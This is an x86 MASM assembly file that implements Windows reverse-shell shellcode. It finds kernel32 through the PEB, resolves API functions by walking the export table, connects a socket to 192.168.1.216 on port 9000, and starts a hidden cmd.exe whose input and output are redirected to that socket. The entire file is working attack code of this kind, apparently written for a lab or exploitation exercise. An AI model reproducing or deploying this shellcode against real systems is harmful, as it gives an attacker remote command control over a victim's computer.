.686p 
.xmm
.model flat,c
.stack 4096


; include C libraries
includelib      msvcrtd

.code
        
public  main

main proc

    ; define local variables
    
    PROCESS_INFORMATION_struct= dword ptr -0B8h
    STARTUPINFO_struct= dword ptr -0A8h
    sockaddr_in_struct= dword ptr -60h
    addr_of_ExitProcess= dword ptr -50h
    addr_of_CreateProcessA= dword ptr -4Ch
    addr_of_connect= dword ptr -48h
    addr_of_WSASocketA= dword ptr -44h
    addr_of_WSAStartup= dword ptr -40h
    addr_of_getProcAddress= dword ptr -3Ch
    addr_of_loadLibraryA= dword ptr -38h
    ordinal_table_addr= dword ptr -34h
    name_pointer_table_addr= dword ptr -30h
    address_table_addr= dword ptr -2Ch
    ExitProcessStr= dword ptr -28h
    cmdexeStr= dword ptr -24h
    CreateProcessAstr= dword ptr -20h
    connectStr= dword ptr -1Ch
    WSASocketAstr= dword ptr -18h
    WSAStartupStr= dword ptr -14h
    ws2_32DllStr= dword ptr -10h
    getProcAddressStr= dword ptr -0Ch
    LoadLibraryAstr= dword ptr -08h
    krnl32_image_base= dword ptr -04h

    push eax ; Save all registers
    push ebx
    push ecx
    push edx
    push esi
    push edi

    push ebp
	mov ebp, esp
	sub esp, 0B8h 			; Allocate memory on stack for local variables

    
    call find_shellcode_real_address    ; makes rip (curr instruction register) get pushed to the stack

    find_shellcode_real_address:
        pop     edi    ; store address of shellcode
    
    mov     esi, offset find_shellcode_real_address    ; store "fake" address of shellcode

    mov	    eax, LABEL_STR_LOADLIBRARYA     ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + loadLibraryAstr], eax    ; name LoadLibraryA

    mov	    eax, LABEL_STR_GETPROCADDRESS     ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + getProcAddressStr], eax    ; name GetProcAddress

    mov	    eax, LABEL_STR_WS2_32DLL     ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + ws2_32DllStr], eax    ; name ws2_32.dll

    mov	    eax, LABEL_STR_WSASTARTUP     ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + WSAStartupStr], eax    ; name WSAStartup

    mov	    eax, LABEL_STR_WSASOCKETA    ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + WSASocketAstr], eax    ; name WSASocketA

    mov	    eax, LABEL_STR_CONNECT    ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + connectStr], eax    ; name connect

    mov	    eax, LABEL_STR_CREATEPROCESSA     ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + CreateProcessAstr], eax    ; name CreateProcessA

    mov	    eax, LABEL_STR_CMDEXE     ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + cmdexeStr], eax    ; name cmd.exe

    mov	    eax, LABEL_STR_EXITPROCESS    ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + ExitProcessStr], eax    ; name ExitProcess
    
    ; no need for real and fake address of shellcode anymore, since we finished with constants
    

    ASSUME fs:nothing

    mov     eax, fs:[30h]     ; Get pointer to PEB

    ASSUME FS:ERROR

    mov     eax, [eax + 0Ch]    ; Get pointer to PEB_LDR_DATA
    mov     eax, [eax + 14h]    ; Get pointer to first entry in InMemoryOrderModuleList
    mov     eax, [eax]  ; Get pointer to second (ntdll.dll) entry in InMemoryOrderModuleList
    mov     eax, [eax]   ; Get pointer to third (kernel32.dll) entry in InMemoryOrderModuleList
    mov     eax, [eax + 10h]    ; Get kernel32.dll image base
    mov     [ebp + krnl32_image_base], eax ; save image base

    add     eax, [eax + 3Ch]    ; get to e_lfanew
    mov     eax, [eax + 78h]    ; get RVA of DataDirectory[0] - exports directory 
    add     eax, [ebp + krnl32_image_base]     ; add image base get to DataDirectory[0] - exports directory
    
    ; Now, as eax contains the address of DataDirectory[0], we can traverse it to find what we need

    mov     ebx, [eax + 1Ch]    ; get RVA of address table
    add     ebx, [ebp + krnl32_image_base]     ; add image base to get to address table
    mov     [ebp + address_table_addr], ebx

    mov     ebx, [eax + 20h]    ; get RVA of name pointer table
    add     ebx, [ebp + krnl32_image_base]     ; add image base to get to name pointer table
    mov     [ebp + name_pointer_table_addr], ebx

    mov     ebx, [eax + 24h]    ; get RVA of ordinals table
    add     ebx, [ebp + krnl32_image_base]     ; add image base to get to ordinals table
    mov     [ebp + ordinal_table_addr], ebx

    mov     edx, [eax + 14h]    ; number of exported functions

    xor     eax, eax   ; reset counter to 0

    LOOP_TO_FIND_LOADLIBRARYA:
        mov     edi, [ebp + name_pointer_table_addr]    ; address of name pointer table
        mov     esi, [ebp + LoadLibraryAstr]     ; name LoadLibraryA
        
        cld
        mov     edi, [edi + eax * 4]    ; edx = RVA nth entry (RVA of name string)

        add     edi, [ebp + krnl32_image_base] ; add image base
        mov     ecx, lenLoadLibraryAstr
        repe    cmpsb     ; compare the first (length of LoadLibraryA) bytes

        jz FOUND_LOADLIBRARYA

        inc     eax
        cmp     eax, edx
        jb      LOOP_TO_FIND_LOADLIBRARYA

        FOUND_LOADLIBRARYA:
            mov     ecx, [ebp + ordinal_table_addr]     ; address of ordinal table
            mov     edx, [ebp + address_table_addr]     ; address of address table

            mov     ax, [ecx + eax * 2]    ; ordinal number
            mov     eax, [edx + eax * 4]    ; get RVA of function
            add     eax, [ebp + krnl32_image_base]    ; get to address of function
            mov     [ebp + addr_of_loadLibraryA], eax
    
    
    xor     eax, eax    ; reset counter to 0

    LOOP_TO_FIND_GETPROCADDRESS:
        mov     edi, [ebp + name_pointer_table_addr]    ; address of name pointer table
        mov     esi, [ebp + getProcAddressStr]     ; name GetProcAddress
        
        cld
        mov     edi, [edi + eax * 4]    ; edx = RVA nth entry (RVA of name string)

        add     edi, [ebp + krnl32_image_base] ; add image base
        mov     ecx, lenGetProcAddressStr
        repe    cmpsb     ; compare the first (length of GetProcAddress) bytes

        jz FOUND_GETPROCADDRESS

        inc     eax
        cmp     eax, edx
        jb      LOOP_TO_FIND_GETPROCADDRESS

        FOUND_GETPROCADDRESS:
            mov     ecx, [ebp + ordinal_table_addr]     ; address of ordinal table
            mov     edx, [ebp + address_table_addr]     ; address of address table

            mov     ax, [ecx + eax * 2]     ; ordinal number
            mov     eax, [edx + eax * 4]    ; get RVA of function
            add     eax, [ebp + krnl32_image_base]    ; get to address of function
            mov     [ebp + addr_of_getProcAddress], eax

    USE_FUNCTIONS_TO_CREATE_REVERSE_SHELL:
        
        ; Find addresses of functions, connect to the server and redirect the shell to it


        ; Use LoadLibraryA to load ws2_32.dll

        mov     eax, [ebp + addr_of_loadLibraryA]
        push    [ebp + ws2_32DllStr]    ; name ws2_32.dll
        call    eax     ; eax now contains the addr of LoadLibraryA
        mov     ebx, eax   ; Now ebx contains the handle to ws2_32.dll

        ; Get address of WSAStartup

        mov     eax, [ebp + addr_of_getProcAddress]
        push    [ebp + WSAStartupStr]      ; name WSAStartup
        push    ebx     ; the handle of ws2_32.dll
        call    eax     ; Call GetProcAddress
        mov     [ebp + addr_of_WSAStartup], eax

        ; Get address of WSASocketA

        mov     eax, [ebp + addr_of_getProcAddress]
        push    [ebp + WSASocketAstr]      ; name WSASocketA
        push    ebx     ; the handle of ws2_32.dll
        call    eax     ; Call GetProcAddress
        mov     [ebp + addr_of_WSASocketA], eax
        
        ; Get address of connect

        mov     eax, [ebp + addr_of_getProcAddress]
        push    [ebp + connectStr]      ; name connect
        push    ebx     ; the handle of ws2_32.dll
        call    eax     ; Call GetProcAddress
        mov     [ebp + addr_of_connect], eax

        ; Get address of CreateProcessA

        mov     eax, [ebp + addr_of_getProcAddress]
        push    [ebp + CreateProcessAstr]      ; name CreateProcessA
        push    [ebp + krnl32_image_base]    ; the handle of ws2_32.dll
        call    eax     ; Call GetProcAddress
        mov     [ebp + addr_of_CreateProcessA], eax

        ; Get address of ExitProcess

        mov     eax, [ebp + addr_of_getProcAddress]
        push    [ebp + ExitProcessStr]      ; name ExitProcess
        push    [ebp + krnl32_image_base]    ; the handle of ws2_32.dll
        call    eax     ; Call GetProcAddress
        mov     [ebp + addr_of_ExitProcess], eax

        ; Call WSAStartUp

        xor     edx, edx
        mov     dx, 190h
        sub     esp, edx    ; alloc space for the WSADATA structure
        push    esp         ; push a pointer to the space allocated
        push    202h        ; push the wVersionRequested parameter

        call    [ebp + addr_of_WSAStartup]        ; call WSAStartup

        ; Call WSASocketA

        xor     edx, edx
        push    edx		; dwFlags = NULL
	    push    edx		; g = NULL
	    push    edx		; lpProtocolInfo = NULL
        mov     dl, 6h  ; protocol (IPPROTO_TCP)
        push    edx
        sub     dl, 5h
        push    edx     ; type = 1 (SOCK_STREAM)
        inc     edx
        push    edx     ; af = 2 (AF_INET)
        call    [ebp + addr_of_WSASocketA]     ; call WSASocketA
        mov     ebx, eax    ; socket file descripter returned from WSASocket

        ; Call connect

        push    10h  ; sizeof(struct sockaddr_in)
        mov     [ebp + sockaddr_in_struct], 2h  ; family (AF_INET = 2)
        mov     [ebp + sockaddr_in_struct + 2h], 2823h  ; port 9000
        mov     [ebp + sockaddr_in_struct + 4h], 0D801A8C0h  ; ip 192.168.1.216
        lea     eax, [ebp + sockaddr_in_struct]      ; ptr to sockaddr_in struct
        push    eax
        push    ebx     ; socket file descripter

        call    [ebp + addr_of_connect]      ; call connect

        ; Call CreateProcessA

        mov     ecx, 15h
        xor     edx, edx

        zero_mem_structs:   ; "memset" the STARTUPINFO and PROCESS_INFORMATION structs to 0's
            mov     [ebp + PROCESS_INFORMATION_struct + 4h * ecx], edx
            loop zero_mem_structs

        mov     [ebp + STARTUPINFO_struct], 44h    ; cb field (size of struct)
        mov     [ebp + STARTUPINFO_struct + 2Ch], 100h     ; dwFlags field - STARTF_USESTDHANDLES
        mov     [ebp + STARTUPINFO_struct + 38h], ebx   ; set handle hStdInput to the socket file descriptor
        mov     [ebp + STARTUPINFO_struct + 3Ch], ebx   ; set handle hStdOutput to the socket file descriptor
        mov     [ebp + STARTUPINFO_struct + 40h], ebx   ; set handle hStdError to the socket file descriptor
        
        lea     eax, [ebp + PROCESS_INFORMATION_struct]     ; pointer to PROCESS_INFORMATION
        push    eax
        lea     eax, [ebp + STARTUPINFO_struct]     ; pointer to STARTUPINFO
        push    eax
        push    edx     ; NULLs
        push    edx
        push    08000000h       ; dwCreationFlags - CREATE_NO_WINDOW
        inc     edx     ; bInheritHandles == true (1)
        push    edx
        dec     edx
        push    edx     ; NULLs again
        push    edx
        push    [ebp + cmdexeStr]   ; name cmd.exe
        push    edx

        call    [ebp + addr_of_CreateProcessA]

        ; Call ExitProcess

        push    edx
        call    [ebp + addr_of_ExitProcess]


    MAIN_END:

    add     esp, 0B8h

    pop ebp 		; restore all registers and exit
	pop edi
    pop esi
	pop edx
	pop ecx
	pop ebx
	pop eax

	retn

    ; String constants

    LABEL_STR_LOADLIBRARYA:
        loadLibraryAstrInLabel db "LoadLibraryA", 0
        lenLoadLibraryAstr equ $ - loadLibraryAstrInLabel

    LABEL_STR_GETPROCADDRESS:
        getProcAddressStrInLabel db "GetProcAddress", 0
        lenGetProcAddressStr equ $ - getProcAddressStrInLabel

    LABEL_STR_WS2_32DLL:
        ws2_32InLabel db "ws2_32.dll", 0

    LABEL_STR_WSASTARTUP:
        WSAStartUpInLabel db "WSAStartup", 0

    LABEL_STR_WSASOCKETA:
        WSASocketAinLabel db "WSASocketA", 0

    LABEL_STR_CONNECT:
        connectInLabel db "connect", 0

    LABEL_STR_CREATEPROCESSA:
        CreateProcessAinLabel db "CreateProcessA", 0

    LABEL_STR_CMDEXE:
        cmdexeInLabel db "cmd.exe", 0

    LABEL_STR_EXITPROCESS:
        ExitProcessInLabel db "ExitProcess", 0

main endp

        end